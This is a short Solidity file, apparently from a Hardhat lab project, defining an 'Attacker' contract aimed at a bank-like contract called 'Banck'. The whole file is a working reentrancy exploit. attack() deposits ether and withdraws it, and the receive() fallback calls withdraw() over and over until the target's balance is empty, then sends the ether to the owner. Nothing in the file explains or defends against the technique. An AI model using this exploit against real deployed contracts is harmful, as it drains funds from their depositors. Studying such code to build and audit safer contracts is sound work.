// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Token.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBanck {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker is Ownable {
    IBanck private immutable banck;

    constructor(address _banck){
        banck = IBanck(_banck);
    }
    
    function attack() external payable onlyOwner {
        banck.deposit{value: msg.value}();
        banck.withdraw();
    }
    
    // receive ether
    receive() external payable {
        if (address(banck).balance > 0) {
            
        banck.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }

}
